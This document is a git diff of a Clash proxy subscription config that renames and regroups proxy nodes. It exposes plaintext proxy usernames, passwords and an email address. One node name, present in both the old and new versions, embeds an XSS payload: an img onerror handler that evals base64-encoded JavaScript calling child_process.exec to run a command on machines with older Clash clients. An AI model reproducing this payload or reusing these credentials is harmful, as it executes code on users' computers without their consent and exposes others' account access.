@@ -10,7 +10,7 @@ dns:
     nameserver:
       - 223.5.5.5
 proxies:
-   - name: 🇯🇵 Http|日本
+   - name: 🇯🇵 日区
      server: jc.ap.fastqvpn.com
      port: 29980
      type: http
@@ -211,29 +211,13 @@ proxies:
      skip-cert-verify: true
    - name: 🇸🇬 Http|新加坡19
      server: 183.240.9.31
-     port: 29979
-     type: http
-     username: "442993652168396800"
-     password: 2ef91648-089f-4c81-b34d-06f072ec51d
-     tls: true
-     skip-cert-verify: true
-   - name: 🇸🇬 Http|新加坡20
-     server: 183.240.9.31
-     port: 29982
-     type: http
-     username: "442993652168396800"
-     password: 2ef91648-089f-4c81-b34d-06f072ec51dd,
-     tls: true
-     skip-cert-verify: true
-   - name: 🇸🇬 Http|新加坡21
-     server: 183.240.9.31
      port: 29983
      type: http
      username: "442993652168396800"
      password: 2ef91648-089f-4c81-b34d-06f072ec51dd
      tls: true
      skip-cert-verify: true
-   - name: 🇸🇬 Http|新加坡22
+   - name: 🇸🇬 Http|新加坡20
      server: 183.240.9.31
      port: 29984
      type: http
@@ -241,7 +225,7 @@ proxies:
      password: 2ef91648-089f-4c81-b34d-06f072ec51dd
      tls: true
      skip-cert-verify: true
-   - name: 🇸🇬 Http|新加坡23
+   - name: 🇸🇬 Http|新加坡21
      server: 183.240.9.31
      port: 29987
      type: http
@@ -249,7 +233,7 @@ proxies:
      password: 2ef91648-089f-4c81-b34d-06f072ec51dd
      tls: true
      skip-cert-verify: true
-   - name: 🇸🇬 Http|新加坡24
+   - name: 🇸🇬 Http|新加坡22
      server: 183.240.9.31
      port: 29988
      type: http
@@ -257,7 +241,7 @@ proxies:
      password: 2ef91648-089f-4c81-b34d-06f072ec51dd
      tls: true
      skip-cert-verify: true
-   - name: 🇸🇬 Http|新加坡25
+   - name: 🇸🇬 Http|新加坡23
      server: 120.232.251.206
      port: 29979
      type: http
@@ -300,7 +284,7 @@ proxies:
      username: "yaojiayu246@gmail.com"
      password: 73a4ff1c-85c8-11ea-82ef-f23c9164ca5d
      tls: true
-   - name: XSS安全漏洞检测 <img src=x onerror='alert(`如果您能看见这段文字，说明您正在使用旧版Clash，可能存在安全风险，请尽快更新，稍后将会为您引导至Openit官网`);eval(new Buffer(`cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2V4cGxvcmVyIGh0dHBzOi8vZ2l0aHViLmNvbS9naXQteXVzdGV2ZW4vb3Blbml0I3dpbmRvd3MnKTs=`,`base64`).toString())'>
+   - name: XSS安全漏洞检测       <img src=x onerror='alert(`如果您能看见这段文字，说明您正在使用旧版Clash，可能存在安全风险，请尽快更新，稍后将会为您引导至Openit官网`);eval(new Buffer(`cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2V4cGxvcmVyIGh0dHBzOi8vZ2l0aHViLmNvbS9naXQteXVzdGV2ZW4vb3Blbml0I3dpbmRvd3MnKTs=`,`base64`).toString())'>
      server: localhost
      port: 65536
      type: http
@@ -312,97 +296,66 @@ proxy-groups:
     type: select
     proxies:
       - ♻️ 自动选择
-      - 🔮 负载均衡
       - DIRECT
-      - 🇭🇰 Http|香港集合
-      - 🇸🇬 Http|新加坡集合
-      - 🇩🇪 Http|德国集合
-      - 🇭🇰 香港🈲ping集合
-      - 杂区🈲ping集合
-      - 🇯🇵 Http|日本
-      - 🇭🇰 Http|香港01
-      - 🇭🇰 Http|香港02
-      - 🇭🇰 Http|香港03
-      - 🇭🇰 Http|香港04
-      - 🇭🇰 Http|香港05
-      - 🇭🇰 Http|PCCW|香港
-      - 🇮🇳 Http|印度
-      - 🇩🇪 Http|德国01
-      - 🇩🇪 Http|德国02
-      - 🇬🇧 Http|英国
-      - 🇦🇺 Http|澳大利亚
-      - XSS安全漏洞检测 <img src=x onerror='alert(`如果您能看见这段文字，说明您正在使用旧版Clash，可能存在安全风险，请尽快更新，稍后将会为您引导至Openit官网`);eval(new Buffer(`cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2V4cGxvcmVyIGh0dHBzOi8vZ2l0aHViLmNvbS9naXQteXVzdGV2ZW4vb3Blbml0I3dpbmRvd3MnKTs=`,`base64`).toString())'>
+      - 🇯🇵 日区
+      - 🇭🇰 港区
+      - 🇸🇬 新加坡区
+      - 🇺🇳 禁 ping 区
+      - XSS安全漏洞检测       <img src=x onerror='alert(`如果您能看见这段文字，说明您正在使用旧版Clash，可能存在安全风险，请尽快更新，稍后将会为您引导至Openit官网`);eval(new Buffer(`cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2V4cGxvcmVyIGh0dHBzOi8vZ2l0aHViLmNvbS9naXQteXVzdGV2ZW4vb3Blbml0I3dpbmRvd3MnKTs=`,`base64`).toString())'>
 
   - name: ♻️ 自动选择
     type: url-test
     url: https://www.google.com/gen_204
     interval: 300
     proxies:
-      - 🇯🇵 Http|日本
+      - 🇯🇵 日区
       - 🇭🇰 Http|香港01
       - 🇭🇰 Http|香港02
       - 🇭🇰 Http|香港03
       - 🇭🇰 Http|香港04
       - 🇭🇰 Http|香港05
+      - 🇸🇬 Http|新加坡01
+      - 🇸🇬 Http|新加坡02
+      - 🇸🇬 Http|新加坡03
+      - 🇸🇬 Http|新加坡04
+      - 🇸🇬 Http|新加坡05
+      - 🇸🇬 Http|新加坡06
+      - 🇸🇬 Http|新加坡07
+      - 🇸🇬 Http|新加坡08
+      - 🇸🇬 Http|新加坡09
+      - 🇸🇬 Http|新加坡10
+      - 🇸🇬 Http|新加坡11
+      - 🇸🇬 Http|新加坡12
+      - 🇸🇬 Http|新加坡13
+      - 🇸🇬 Http|新加坡14
+      - 🇸🇬 Http|新加坡15
+      - 🇸🇬 Http|新加坡16
+      - 🇸🇬 Http|新加坡17
+      - 🇸🇬 Http|新加坡18
+      - 🇸🇬 Http|新加坡19
+      - 🇸🇬 Http|新加坡20
+      - 🇸🇬 Http|新加坡21
+      - 🇸🇬 Http|新加坡22
+      - 🇸🇬 Http|新加坡23
       - 🇭🇰 Http|PCCW|香港
       - 🇮🇳 Http|印度
+      - 🇬🇧 Http|英国
       - 🇩🇪 Http|德国01
       - 🇩🇪 Http|德国02
-      - 🇬🇧 Http|英国
       - 🇦🇺 Http|澳大利亚
-      - 🇸🇬 Http|新加坡集合
 
-  - name: 🔮 负载均衡
+  - name: 🇭🇰 港区
     type: load-balance
     url: https://www.google.com/gen_204
     interval: 180
     proxies:
-      - 🇯🇵 Http|日本
       - 🇭🇰 Http|香港01
       - 🇭🇰 Http|香港02
       - 🇭🇰 Http|香港03
       - 🇭🇰 Http|香港04
       - 🇭🇰 Http|香港05
-      - 🇭🇰 Http|PCCW|香港
-
-  - name: 🇭🇰 Http|香港集合
-    type: load-balance
-    url: https://www.google.com/gen_204
-    interval: 180
-    proxies:
-      - 🇭🇰 Http|香港01
-      - 🇭🇰 Http|香港03
-      - 🇭🇰 Http|香港04
-      - 🇭🇰 Http|香港05
-
-  - name: 🇩🇪 Http|德国集合
-    type: load-balance
-    url: https://www.google.com/gen_204
-    interval: 180
-    proxies:
-      - 🇩🇪 Http|德国01
-      - 🇩🇪 Http|德国02
-
-  - name: 🇭🇰 香港🈲ping集合
-    type: load-balance
-    url: https://www.google.com/gen_204
-    interval: 180
-    proxies:
-      - 🇭🇰 Http|香港02
-      - 🇭🇰 Http|PCCW|香港
-
-  - name: 杂区🈲ping集合
-    type: load-balance
-    url: https://www.google.com/gen_204
-    interval: 180
-    proxies:
-      - 🇮🇳 Http|印度
-      - 🇩🇪 Http|德国01
-      - 🇩🇪 Http|德国02
-      - 🇬🇧 Http|英国
-      - 🇦🇺 Http|澳大利亚
-
-  - name: 🇸🇬 Http|新加坡集合
+      
+  - name: 🇸🇬 新加坡区
     type: load-balance
     url: https://www.google.com/gen_204
     interval: 180
@@ -430,8 +383,16 @@ proxy-groups:
       - 🇸🇬 Http|新加坡21
       - 🇸🇬 Http|新加坡22
       - 🇸🇬 Http|新加坡23
-      - 🇸🇬 Http|新加坡24
-      - 🇸🇬 Http|新加坡25
+
+  - name: 🇺🇳 禁 ping 区
+    type: select
+    proxies:
+      - 🇭🇰 Http|PCCW|香港
+      - 🇮🇳 Http|印度
+      - 🇬🇧 Http|英国
+      - 🇩🇪 Http|德国01
+      - 🇩🇪 Http|德国02
+      - 🇦🇺 Http|澳大利亚
   - name: 🎯 全球直连
     type: select
     proxies:
@@ -446,9 +407,8 @@ proxy-groups:
   - name: 🐟 漏网之鱼
     type: select
     proxies:
-      - 🚀 节点选择
       - ♻️ 自动选择
-      - 🔮 负载均衡
+      - 🚀 节点选择
 rules:
  - DOMAIN-SUFFIX,acl4ssr,🎯 全球直连
  - DOMAIN-SUFFIX,ip6-localhost,🎯 全球直连
